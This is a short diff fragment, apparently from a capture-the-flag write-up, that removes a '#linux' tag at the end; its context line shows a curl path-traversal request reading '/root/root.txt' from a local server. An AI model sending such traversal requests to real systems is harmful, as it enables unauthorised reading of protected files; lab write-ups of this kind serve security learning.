@@ -390,5 +390,3 @@ curl -s --path-as-is "http://localhost:8081/assets/../../../../../root/root.txt"
 ```
 EASY
 Rooted
-
-#linux 
